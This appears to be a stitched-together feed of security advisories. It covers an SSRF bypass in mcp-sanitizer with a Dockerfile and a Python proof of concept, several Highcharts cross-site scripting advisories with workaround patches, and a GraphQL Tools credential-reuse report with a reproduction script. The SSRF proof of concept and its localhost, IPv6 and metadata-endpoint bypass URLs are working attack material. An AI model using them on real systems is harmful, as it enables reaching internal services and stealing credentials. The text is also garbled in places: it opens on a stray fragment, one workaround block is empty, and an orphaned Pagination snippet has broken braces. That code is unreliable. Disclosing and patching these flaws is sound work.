}
NODE
```

### Impact

This is a **Server-Side Request Forgery (SSRF)** vulnerability. Any application that:

1. Uses `mcp-sanitizer`'s `sanitize()` / `createMCPToolMiddleware()` as the security boundary for outbound URLs, **and**
2. Passes the returned sanitized URL to an HTTP client (the library's documented intended use for `web_fetch`/`web_scraper` MCP tools),

is exploitable by any party that can supply the `url` parameter — typically an unauthenticated network attacker in an MCP server deployment.

**Consequences:**
- **Confidentiality (High):** The attacker can retrieve responses from internal services such as cloud metadata endpoints (e.g., `http://169.254.169.254/`), admin panels, or any localhost daemon, potentially exposing credentials, tokens, or sensitive configuration.
- **Integrity (Low):** If internal services expose writable APIs, the attacker can trigger state changes or issue commands via HTTP.
- **Availability:** Not directly impacted.

The vulnerability requires no authentication, no special configuration, and no user interaction; it is exploitable in the default middleware path.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM node:18-alpine

# Install Python3 for the PoC script
RUN apk add --no-cache python3

WORKDIR /app

# Copy package files first for better layer caching
COPY repo/package.json repo/package-lock.json ./

# Install Node.js dependencies (clean install, no dev deps)
RUN npm ci --ignore-scripts --omit=dev

# Copy library source
COPY repo/src ./src/

# Copy PoC script
COPY vuln-001/poc.py ./poc.py

# Run the PoC by default
CMD ["python3", "poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: mcp-sanitizer SSRF bypass via localhost+port and IPv6 bracket notation
Library: mcp-sanitizer v1.3.3 (commit caff5d6)
CWE-918: Server-Side Request Forgery
CVSS 3.1: 8.2 (High)

Root cause:
  src/utils/validation-utils.js:274:
    if ((hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1') && !parsedUrl.port)
  - The "&& !parsedUrl.port" guard means any localhost URL WITH a port bypasses the block.
  - Node.js URL API returns hostname as "[::1]" / "[fe80::1]" (with brackets) for IPv6,
    so the string equality check against "::1" and startsWith("fe80:") both silently fail.

Attack scenario:
  1. Attacker controls the "url" parameter of a web_fetch / web_scraper MCP tool call.
  2. The server calls sanitize(params.url, { type: 'url' }) and trusts the result.
  3. Because the bypass succeeds, the server makes an outbound HTTP request to an internal
     service (localhost:PORT), leaking its response to the attacker.
"""

import subprocess
import sys
import json
import http.server
import threading
import urllib.request
import os

# ─────────────────────────────────────────────────────────────────────────────
# Step 1: Start a mock "internal" service on 127.0.0.1:8080
#         This simulates a privileged internal endpoint (e.g., metadata API,
#         admin panel) that should never be reachable from external input.
# ─────────────────────────────────────────────────────────────────────────────
INTERNAL_PORT = 8080
INTERNAL_SECRET = "INTERNAL_SECRET_DATA_9f3a2b1c"

class InternalServiceHandler(http.server.BaseHTTPRequestHandler):
    """Simulates a restricted internal HTTP service (e.g., admin API or metadata endpoint)."""

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("X-Internal", "true")
        self.end_headers()
        self.wfile.write(f"{INTERNAL_SECRET}\npath={self.path}\n".encode())

    def log_message(self, fmt, *args):
        pass  # Suppress default access logs for cleaner output


internal_server = http.server.HTTPServer(("127.0.0.1", INTERNAL_PORT), InternalServiceHandler)
srv_thread = threading.Thread(target=internal_server.serve_forever, daemon=True)
srv_thread.start()
print(f"[*] Mock internal service started on 127.0.0.1:{INTERNAL_PORT}")
print(f"[*] Internal secret: {INTERNAL_SECRET}\n")


# ─────────────────────────────────────────────────────────────────────────────
# Step 2: Run the mcp-sanitizer via Node.js to test bypass URLs
# ─────────────────────────────────────────────────────────────────────────────
NODE_SCRIPT = r"""
'use strict';
const MCPSanitizer = require('./src/sanitizer/mcp-sanitizer');
const sanitizer = new MCPSanitizer();

const tests = [
  // These should be BLOCKED (baseline: library is supposed to block localhost)
  { url: 'http://localhost/',        expectBlocked: true  },
  { url: 'http://127.0.0.1/',       expectBlocked: true  },
  // These are the BYPASS cases (the vulnerability)
  { url: 'http://localhost:8080/',   expectBlocked: false },
  { url: 'http://[::1]:8080/',      expectBlocked: false },
  { url: 'http://[fe80::1]:8080/',  expectBlocked: false },
];

const out = tests.map(t => {
  let result;
  try {
    result = sanitizer.sanitize(t.url, { type: 'url' });
    return {
      url: t.url,
      blocked: result.blocked,
      sanitized: result.sanitized,
      expectBlocked: t.expectBlocked
    };
  } catch (err) {
    return {
      url: t.url,
      blocked: true,
      sanitized: null,
      expectBlocked: t.expectBlocked,
      error: err.message
    };
  }
});

process.stdout.write(JSON.stringify(out));
"""

print("[*] Running mcp-sanitizer URL sanitization tests via Node.js ...")
proc = subprocess.run(
    ["node", "-e", NODE_SCRIPT],
    capture_output=True,
    text=True,
    cwd="/app"
)

if proc.returncode != 0:
    print(f"[ERROR] Node.js process exited with code {proc.returncode}")
    print(f"stderr: {proc.stderr}")
    sys.exit(2)

if not proc.stdout.strip():
    print("[ERROR] No output from Node.js process")
    print(f"stderr: {proc.stderr}")
    sys.exit(2)

results = json.loads(proc.stdout)


# ─────────────────────────────────────────────────────────────────────────────
# Step 3: Print sanitizer results and identify bypassed URLs
# ─────────────────────────────────────────────────────────────────────────────
print("[*] Sanitizer results:\n")
header = f"{'URL':<35}  {'blocked':<8}  {'sanitized':<35}  status"
print(header)
print("-" * len(header))

bypass_urls = []
unexpected = []

for r in results:
```

### GHSA-mw4f-gj5x-6xr4 — Highcharts Core: `javascript:` URL in an `xlink:href` attribute survives text filtering and reaches exported charts
- Aliases: CVE-2026-116796 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-79
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N`
- Affected npm/highcharts: introduced:10.3.2 fixed:11.4.9
- Affected npm/highcharts: introduced:12.0.0 fixed:12.6.2
- Affected npm/highcharts: introduced:13.0.0 fixed:13.1.1

### Impact
The filter applied to markup in text options checks `href`, `src` and a few similar attributes against an allowed-scheme list, but accepts `xlink:href` without that check, so an SVG anchor whose `xlink:href` is a `javascript:` URL passes the filter, whether or not the option is rendered with `useHTML`. In the live page the attribute is written without the XLink namespace, so browsers do not treat the anchor as a link there.

The attribute is preserved verbatim in the chart's serialised output: the SVG produced by the exporting module, including the default SVG download, declares the XLink namespace and contains the anchor, and so does the markup of the chart container. Any document that parses that output again, such as the downloaded SVG opened in a browser or a page that inlines exported or server-rendered chart markup, then holds a working link, and an attacker who controls the chart configuration can thereby run script in the origin of that document when a user activates the link.

Exploitation requires that untrusted data reach a text option such as the title, that the chart be exported or its markup be serialised and parsed again, and that a user activate the link.

### Workarounds
Drop-in fix for all affected versions (10.3.2 - 13.1.0).

Add the below IIFE to run after Highcharts is loaded, before creating a chart.

```

```

### GHSA-65hg-cf3f-5m39 — Highcharts Core: HTML text parsing falls back to unfiltered `innerHTML` during printing
- Aliases: CVE-2026-118244 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-79
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N`
- Affected npm/highcharts: introduced:12.0.0 fixed:12.6.1
- Affected npm/highcharts: introduced:13.0.0 fixed:13.1.0

### Impact
When the HTML text parser cannot obtain a document from `DOMParser` because the call throws, it falls back to assigning the raw markup to the `innerHTML` of an element created in the hosting document, and the allow-list is applied only to the resulting DOM afterwards. In Chromium the Trusted Types policy callback that the parser uses throws while a `beforeprint` handler is running, so if the hosting page re-renders the chart from a `beforeprint` handler, every HTML-rendered text option parsed at that moment, such as `useHTML` titles, axis labels and data labels or text set by responsive rules, is inserted unsanitized, and event handlers embedded in that markup run in the origin of the page hosting the chart. Exploitation requires that untrusted data reach the chart configuration, that the hosting page update the chart from a `beforeprint` handler in Chromium, and that printing be started, which the print item of the exporting menu does on its own. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.

### GHSA-grj7-r4jv-pw9j — Highcharts Dashboards: `chartConstructor` is an unchecked lookup into the Highcharts namespace
- Aliases: CVE-2026-118245 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-79
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N`
- Affected npm/@highcharts/dashboards: introduced:1.0.0 fixed:4.2.2

### Impact
The Highcharts component uses the value of `chartConstructor` to select a function from the Highcharts namespace and invokes it with the component's container element and its `chartOptions`, without checking the value against the supported chart constructors. An attacker who controls the dashboard configuration can therefore name any other public member of that namespace; utility functions in that namespace copy the supplied options onto the container element as properties or attributes, so markup and event handlers carried in `chartOptions` land in the page and run in the origin of the page hosting the dashboard. Exploitation requires that untrusted data reach the Dashboards component configuration. No user interaction is required beyond rendering the board.

### Workarounds
If your board configuration comes from a source you do not fully control, paste this snippet right after importing libraries:
```ts
(function () {
    const HighchartsComponent =
        Dashboards && Dashboards.HighchartsComponent;

    if (!HighchartsComponent || !HighchartsComponent.prototype.createChart) {
        return; // HighchartsComponent not loaded
    }

    const allowedConstructors = [
        'chart',
        'stockChart',
        'mapChart',
        'ganttChart'
    ];
    const originalCreateChart = HighchartsComponent.prototype.createChart;

    HighchartsComponent.prototype.createChart = function () {
        if (allowedConstructors.indexOf(this.chartConstructor) === -1) {
            this.chartConstructor = 'chart';
        }

        return originalCreateChart.apply(this, arguments);
    };
}());
```

### GHSA-6g3c-p4fg-xv47 — Highcharts Grid: custom icon definition objects written with raw `setAttribute` on `<path>`
- Aliases: CVE-2026-118242 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-79
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N`
- Affected npm/@highcharts/grid-lite: introduced:2.3.0 fixed:3.2.0
- Affected npm/@highcharts/grid-pro: introduced:2.3.0 fixed:3.2.0

### Impact
A custom icon supplied under `rendering.icons` as an icon definition object is built by creating an SVG path for each of its child entries and setting every key of that entry as an attribute of the path, without filtering the attribute names; only the string form of the option is passed through the markup allow-list. An attacker who controls the Grid configuration can therefore supply child entries whose keys name event handlers, and those handlers execute in the origin of the page hosting the Grid. Custom icons take precedence over the built-in ones, so the attacker can replace icons that render without any further configuration, such as the sort icon shown in every column header by default and the pagination controls where pagination is enabled, and does not need any reference to a custom icon name. Exploitation requires that untrusted data reach the Grid configuration and that a user hover over or activate an affected icon.

### Workarounds
If your Grid configuration comes from a source you do not fully control, paste this snippet right after importing the Grid module:

```ts
(function () {
    const GridNS = typeof Grid !== 'undefined' ? Grid : undefined;
    const GridClass = GridNS && GridNS.Grid;

    if (!GridClass || !GridClass.prototype.loadUserOptions) {
        return; // Grid not loaded
    }

    const allowedPathAttributes = [
        'd',
        'fill',
        'opacity',
        'stroke',
        'stroke-width',
        'stroke-linecap',
        'stroke-linejoin',
        'transform'
    ];

    const originalLoadUserOptions = GridClass.prototype.loadUserOptions;

    function sanitizeIconValue(value) {
        if (!value || typeof value === 'string') {
            return value;
        }

        const children = value.children || [];
        const sanitizedChildren = [];

        for (let i = 0; i < children.length; i++) {
            const child = children[i] || {};
            const clean = {};

            for (let j = 0; j < allowedPathAttributes.length; j++) {
                const attr = allowedPathAttributes[j];
                if (child[attr] !== undefined && child[attr] !== null) {
                    clean[attr] = child[attr];
                }
            }

            sanitizedChildren.push(clean);
        }

        return {
            width: value.width,
            height: value.height,
            viewBox: value.viewBox,
            fill: value.fill,
            children: sanitizedChildren
        };
    }

    function sanitizeIconsMap(icons) {
        if (!icons) {
            return icons;
        }

        const out = {};
        for (const key in icons) {
            if (Object.prototype.hasOwnProperty.call(icons, key)) {
                out[key] = sanitizeIconValue(icons[key]);
            }
        }
        return out;
    }

    GridClass.prototype.loadUserOptions = function (newOptions) {
        if (
            newOptions &&
            newOptions.rendering &&
            newOptions.rendering.icons
        ) {
            newOptions.rendering.icons = sanitizeIconsMap(
                newOptions.rendering.icons
            );
        }

        return originalLoadUserOptions.apply(this, arguments);
    };
}());
```

### GHSA-5ghw-9mgr-jvx2 — Highcharts Grid Pro: cell-renderer `attributes` map written with raw `setAttribute`
- Aliases: CVE-2026-116797 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-79
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N`
- Affected npm/@highcharts/grid-pro: introduced:2.0.0 fixed:3.2.0
- Affected npm/@highcharts/dashboards: introduced:3.6.0 fixed:4.0.0 versions: 3.6.0

### Impact
The input-type cell renderers copy every entry of the renderer's `attributes` option onto the input or select element they create, without checking the attribute names. An attacker who controls the Grid configuration can supply entries under a column's `cells.renderer.attributes` or `cells.editMode.renderer.attributes` whose names are event handlers, and those handlers execute in the origin of the page hosting the Grid. A view renderer places the handler on the input rendered in every row of the column as soon as the Grid renders; an edit-mode renderer places it on the input created when a cell enters edit mode, and that input is focused immediately, so a `focus` handler runs as soon as the user starts editing. Exploitation requires that untrusted data reach the Grid configuration and that a user hover over or focus one of the rendered inputs, or begin editing a cell. The Pro DataGrid that shipped inside the Dashboards package is included.

### Workarounds

If your column configuration comes from a source you do not fully control, paste this snippet right after importing the `Grid` module:

```ts
const ALLOWED_RENDERER_ATTRIBUTES = [
    'autofocus', 'checked', 'max', 'maxlength', 'min', 'minlength',
    'multiple', 'pattern', 'placeholder', 'size', 'step'
];

const scrubColumn = (column) => {
    const cells = column?.cells;

    for (const renderer of [cells?.renderer, cells?.editMode?.renderer]) {
        const attributes = renderer?.attributes;

        if (attributes) {
            for (const key of Object.keys(attributes)) {
                if (!ALLOWED_RENDERER_ATTRIBUTES.includes(key.toLowerCase())) {
                    delete attributes[key];
                }
            }
        }
    }

    return column;
};

const scrubOptions = (options) => {
    scrubColumn(options?.columnDefaults);
    (options?.columns || []).forEach(scrubColumn);
    return options;
};

const proto = Grid.Grid.prototype;

const loadUserOptions = proto.loadUserOptions;
proto.loadUserOptions = function (options, ...rest) {
    scrubOptions(Grid.defaultOptions);
    return loadUserOptions.call(this, scrubOptions(options), ...rest);
};

const updateColumn = proto.updateColumn;
proto.updateColumn = function (columnId, options, ...rest) {
    return updateColumn.call(this, columnId, scrubColumn(options), ...rest);
};
```

### GHSA-gfvx-2c2g-38wq — Highcharts: series column construction writes to Object.prototype
- Aliases: CVE-2026-118249 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-1321

- Affected npm/highcharts: introduced:13.0.0 fixed:13.1.0

### Impact

Consequences beyond disruption depend on the consuming application.

### Workarounds

### GHSA-rcqf-f6h2-ccg9 — Highcharts Dashboards parses sidebar component labels as HTML
- Aliases: CVE-2026-118252 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-79
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N`
- Affected npm/@highcharts/dashboards: introduced:1.0.0 fixed:4.2.3

### Impact
The component language strings shown in the edit mode sidebar are parsed as HTML rather than inserted as text. An attacker who controls those language options can supply markup carrying event handlers, which execute in the origin of the page hosting the dashboard once the sidebar renders the affected labels. Exploitation requires that untrusted data reach the Dashboards language configuration and that a user open the edit mode sidebar.

### Workarounds

Until you can upgrade, patch `EditMode` once at application startup. The hook runs before the sidebar is built, so the labels are already harmless by the time they are rendered. Assigning a string to `textContent` and reading back `innerHTML` turns any markup into literal text, which is exactly what the fixed version renders.

After importing the module, use this code snipped once, before any board is created.

```js
{
    const EditMode = window.Dashboards?.EditMode;
    const escapeHTML = (text) => text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    const patched = new WeakSet();
    const originalInit = EditMode.prototype.init;

    EditMode.prototype.init = function (...args) {
        const labels = this.lang?.sidebar;

        if (labels && !patched.has(this)) {
            patched.add(this);

            for (const key of Object.keys(labels)) {
                if (typeof labels[key] === 'string') {
                    labels[key] = escapeHTML(labels[key]);
                }
            }
        }

        return originalInit.apply(this, args);
    };
}
```

If your application does not need Edit Mode, leaving it disabled (`editMode.enabled: false`) removes the exposure as well.

### GHSA-58g7-7f52-h92c — Highcharts Dashboards parses fullscreen labels as HTML
- Aliases: CVE-2026-118253 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-79
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N`
- Affected npm/@highcharts/dashboards: introduced:1.0.0 fixed:4.2.3

### Impact
The edit mode fullscreen labels are parsed as HTML when the corresponding control is rendered. An attacker who controls the Dashboards language options can supply markup carrying event handlers, which then execute in the origin of the page hosting the dashboard. Exploitation requires that untrusted data reach the Dashboards language configuration and that the affected control be rendered. Script running this way has the same access to page data, storage and session state as the hosting application.

### Workarounds

Until you can upgrade, replace `Fullscreen.prototype.setButtonText` atapplication startup. The replacement is the original method with `textContent` in place of `innerHTML`.

#### If you install Dashboards from npm

Import the module once, before any board is created.

```js
import Fullscreen from '@highcharts/dashboards/es-modules/Dashboards/EditMode/Fullscreen.js';

Fullscreen.prototype.setButtonText = function () {
    const editMode = this.board.editMode,
        button = editMode?.tools.contextMenu?.items.viewFullscreen;

    if (button?.innerElement) {
        const lang = editMode.lang;

        button.innerElement.textContent =
            (this.isOpen ? lang.exitFullscreen : lang.viewFullscreen) || '';
    }
};
```

#### If you load Dashboards from a `<script>` tag

The same replacement, taking `Fullscreen` from the global namespace. It must run after `modules/layout` and before any board is created.

```html
<script src="https://code.highcharts.com/dashboards/dashboards.js"></script>
<script src="https://code.highcharts.com/dashboards/modules/layout.js"></script>
<script>
{
    const Fullscreen = window.Dashboards?.Fullscreen;

    Fullscreen.prototype.setButtonText = function () {
        const editMode = this.board.editMode,
            button = editMode?.tools.contextMenu?.items.viewFullscreen;

        if (button?.innerElement) {
            const lang = editMode.lang;

            button.innerElement.textContent =
                (this.isOpen ? lang.exitFullscreen : lang.viewFullscreen) || '';
        }
    };
}
</script>
```

If your application does not need Edit Mode, leaving it disabled (`editMode.enabled: false`) removes the exposure as well. The same applies to the context menu — the label is only reachable when `viewFullscreen` is among `editMode.contextMenu.items`.

Run this once after loading the Grid, before creating any grid:
```javascript
{
    const Pagination = Grid.Pagination;

    const escapeLang = (pagination) => {
        const lang = pagination.lang;

            return;
        }
```

### Workarounds
Paste in after the Grid Pro module is imported, before a Grid is created.

```javascript
const { AST } = Grid;

function sanitize(options) {
    const credits = options && options.credits;

    if (credits && typeof credits.href === 'string') {
        const filtered = AST.filterUserAttributes({ href: credits.href });

        if (!filtered.href) {
            delete credits.href;
        }
    }

    return options;
}

// Both Grid.grid() and grid.update() funnel through loadUserOptions, so one
// hook covers both entry points.
const { prototype } = Grid.Grid;
const loadUserOptions = prototype.loadUserOptions;

prototype.loadUserOptions = function (options, ...rest) {
    sanitize(options);
    return loadUserOptions.call(this, options, ...rest);
};
```

### GHSA-434m-5hcj-pxf3 — GraphQL Tools: Per-request connection parameters persist into later users' WebSocket authentications
- Aliases: CVE-2026-118665 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-613
- CVSS_V4: `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- Affected npm/@graphql-tools/executor-legacy-ws: introduced:0 fixed:1.1.36

# Stale authentication state in `@graphql-tools/executor-legacy-ws`: per-request `extensions.connectionParams` persist in executor closure state and are replayed in a later caller's `connection_init`

## Report metadata

| Field | Value |
| --- | --- |
| Package | `@graphql-tools/executor-legacy-ws` (npm, `pkg:npm/%40graphql-tools/executor-legacy-ws`) |
| Repository | https://github.com/ardatan/graphql-tools |
| Component | `buildWSLegacyExecutor` (`packages/executors/legacy-ws/src/index.ts`) |
| Vulnerability class | Stale authentication state / credential reuse across requests |
| Verified against | Commit `b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1`; npm release `1.1.33` installed and exercised. During validation the same behaviour was also observed on the current latest release `1.1.35`, and the unreset closure is still present on `master`. |
| API surface | Public documented API (`buildWSLegacyExecutor`, and `request.extensions.connectionParams` on the returned executor) |
| Affected in default configuration | Yes — the factory returns a general, reusable `Executor` with no per-identity or single-use restriction, and no supported teardown clears the retained parameters. |

Version note: the originally recorded affected range was `<= 1.1.33`. Validation showed that range understates exposure — the same proof of concept leaks identically on `1.1.35`.

## Summary

`buildWSLegacyExecutor` keeps a single closure-scoped object, `executorConnectionParams`, for the lifetime of the executor. Every execution that carries `request.extensions.connectionParams` merges those keys into that object with `Object.assign`, and the object is merged into the `connection_init` payload each time a new WebSocket opens. Nothing ever removes keys: `cleanupWebsocket` terminates the socket and nulls the handle but leaves `executorConnectionParams` intact, and a later request that simply omits a key skips the conditional update entirely.

The consumer-side shape is a shared executor that forwards per-user credentials. When one long-lived executor serves multiple principals — the schema-stitching, gateway, or mesh pattern where each `ExecutionRequest` supplies its own `extensions.connectionParams` — a request that omits the auth key is sent to the downstream server with the previous caller's `Authorization`/tenant values in its `connection_init`, so the downstream server authenticates the later caller as the earlier user.

Behaviour of the neighbouring state in the same file:

- WebSocket handle (`websocket`) → reset on teardown in `cleanupWebsocket`, [lines 78-88](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L78-L88)
- Per-request `connectionParams` merge, present case → applied as documented, [lines 93-101](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L93-L101)
- `executorConnectionParams` closure object → **never reset; survives socket teardown and is re-sent on the next connection, [line 32](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L32) and [line 54](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L54)**

## Impact

A caller who supplies no credentials (or lower-privileged ones) can have its downstream GraphQL subscription executed under a previous user's retained token or tenant value, and can receive data that its own `connection_init` would not authorize. The credential itself is never disclosed to the attacker — it reaches the sink through closure storage, not because the attacker knows it — but the downstream authorization it represents is.

The new capability versus safe behaviour: without this bug, an anonymous request would open a connection whose `connection_init` contains only base options plus that request's own parameters, and the downstream server would treat it as anonymous. With it, the anonymous request inherits the victim's authorization. Validation also showed partial-overwrite merging: a later caller supplying only `{tenant: "<attacker tenant>"}` gets the victim's `Authorization` retained alongside its own tenant, i.e. an attacker-chosen tenant authenticated with someone else's bearer token.

Scoring note: **not scored.** No CVSS vector accompanies this finding, and exploitability depends on the consuming application's data flow rather than on the library alone. Consumers that construct a fresh executor per request are **not** affected — the in-repository `UrlLoader` wrapper ([`packages/loaders/url/src/index.ts:172-182`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/loaders/url/src/index.ts#L172-L182)) builds a new executor for each request and therefore does not exhibit the persistence. The exposure is to applications that use the exported factory directly and share the executor.

## Preconditions

1. One executor instance created by `buildWSLegacyExecutor` is reused across requests belonging to different users or authorization contexts.
2. The application uses the explicitly supported `extensions.connectionParams` field to carry per-request downstream identity. This field is documented only by the source comment at [line 91](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L91), which says additional connection params can be supplied through extensions but does not warn that values persist into later requests.
3. The first operation's socket is closed before the later operation opens a new one. This is the normal path, not an edge case: the `COMPLETE` handler calls `cleanupWebsocket()` after every operation.
4. Attacker capability required: the ability to make a request through the sharing application — in a gateway, a remote user controls whether they authenticate and which subscription they ask for, and an anonymous request naturally leaves the `connectionParams` key absent.
5. The later request omits at least one sensitive key rather than overwriting every prior key (`Object.assign` merges, it does not replace).

This does **not** require non-standard usage, monkey-patching, or unusual configuration: the affected path is the documented `extensions.connectionParams` feature on the package's public API, and the library does not document per-request credential isolation as a caller responsibility. Validation confirmed that the library's own documented teardown, `executor[Symbol.dispose]()` (bound to `cleanupWebsocket`), does not clear the state either — no supported API resets it.

## Data flow

1. **Source** — a victim `ExecutionRequest` supplies `extensions.connectionParams`, commonly an `Authorization` or tenant token ([`packages/executors/legacy-ws/src/index.ts:90-100`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L90-L100)).
2. **Propagation** — `Object.assign` stores those keys in the closure-scoped `executorConnectionParams` ([`index.ts:32`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L32), [`index.ts:97-100`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L97-L100)).
3. **Propagation** — `cleanupWebsocket` terminates the socket but does not reset `executorConnectionParams` ([`index.ts:78-88`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L78-L88)); the attacker's later request omits `connectionParams`, so the conditional update is skipped and the old keys remain ([`index.ts:93-101`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L93-L101)).
4. **Sink** — the new socket's `onopen` merges the retained state into the `connection_init` payload and sends it before the attacker's operation: `payload = Object.assign(payload, executorConnectionParams); websocket!.send(...connection_init payload...)` ([`index.ts:44-65`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L44-L65), [`index.ts:120-129`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L120-L129)).
5. **Reachability** — the package directly exports `buildWSLegacyExecutor` ([`index.ts:27`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L27)), and the entry point is the returned disposable executor plus `request.extensions.connectionParams`.

## Vulnerable code

`packages/executors/legacy-ws/src/index.ts`, lines 32-100 at `b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1`:

```ts
let executorConnectionParams = {};        // closure state, lives as long as the executor
...
payload = Object.assign(payload, executorConnectionParams);   // sink: retained keys enter connection_init
websocket!.send(JSON.stringify({ type: LEGACY_WS.CONNECTION_INIT, payload }));
...
if (request.extensions?.['connectionParams'] && typeof request.extensions?.['connectionParams'] === 'object') {
  executorConnectionParams = Object.assign(executorConnectionParams, request.extensions['connectionParams']);
}
// no else branch: a request that omits connectionParams leaves the previous request's keys in place,
// and cleanupWebsocket (lines 78-88) resets only `websocket`, never `executorConnectionParams`.
```

## Reproduction

**Verified dynamically against the real package**, not by static review alone. Release `1.1.33` was installed from npm and driven against a live local `ws` server implementing the legacy `graphql-ws` protocol, recording the `connection_init` payload of every physical connection.

Observed across the validation runs, using one shared executor instance:

- Request 1 (victim) sent `extensions.connectionParams` `{Authorization: "Bearer VICTIM-ALICE-SECRET-TOKEN", tenant: "alice-tenant"}`. After that subscription completed, the executor sent `connection_terminate` and tore the socket down.
- Request 2 supplied **no** `connectionParams`, yet the server observed a brand-new connection whose `connection_init` payload was byte-identical to the victim's, including the victim's bearer token.
- Partial overwrite: when the later caller supplied only `{tenant: "mallory-tenant"}`, `Object.assign` merged rather than replaced, so the victim's `Authorization` was retained alongside the attacker's tenant.
- Calling `executor[Symbol.dispose]()` between requests did not clear the state.
- Negative control: patching the installed `1.1.33` to add `executorConnectionParams = {}` inside `cleanupWebsocket` made the second connection's init payload `{}`, so the leak is causally attributable to the missing reset.
- The same proof of concept leaks identically on `1.1.35`, and `master` still contains the unreset closure. Upstream line numbers on `master` are slightly offset from those cited above (closure declaration L38, conditional `Object.assign` L100-105, `cleanupWebsocket` L84, `onopen` merge L60-63).

Steps:

1. Run a legacy GraphQL WS server that records the `connection_init` payload and authorizes notifications by `Authorization` value.
2. Use one executor for a victim request with `extensions.connectionParams.Authorization = 'Bearer victim-token'`; finish/unsubscribe it so cleanup closes the socket.
3. Use the same executor for an anonymous request with no `extensions.connectionParams`.
4. Observe that the second `connection_init` still contains `Bearer victim-token` and that the anonymous subscription receives victim-authorized results.

```ts
import WebSocket from 'isomorphic-ws';
import { parse } from 'graphql';
import { buildWSLegacyExecutor } from '@graphql-tools/executor-legacy-ws';

const exec = buildWSLegacyExecutor('ws://localhost:8081/graphql', WebSocket);

const v = exec({
  document: parse('subscription { privateEvents { id } }'),
  extensions: { connectionParams: { Authorization: 'Bearer victim-token' } },
});
await v.next();
await v.return?.(); // iterator cleanup closes the first socket; executorConnectionParams is not cleared

const a = exec({ document: parse('subscription { privateEvents { id } }') });
await a.next(); // the server logs a second connection_init payload still carrying Authorization: Bearer victim-token
```

- **Expected:** the second `connection_init` payload contains only the base options and the second request's own parameters, with no key omitted by that request carried over from the victim.
- **Actual:** the second `connection_init` carries the victim's retained `Authorization`/tenant values, and the downstream server authenticates the later caller as the victim.

## Suggested remediation

Do not retain operation-level `extensions.connectionParams` beyond the operation and connection they belong to: build each `connection_init` payload from the base options plus the current request's parameters only, and clear connection-specific state during cleanup.

```ts
// 1. Clear the retained state when the connection is torn down.
function cleanupWebsocket() {
  // ... existing connection_terminate / terminate / websocket = null ...
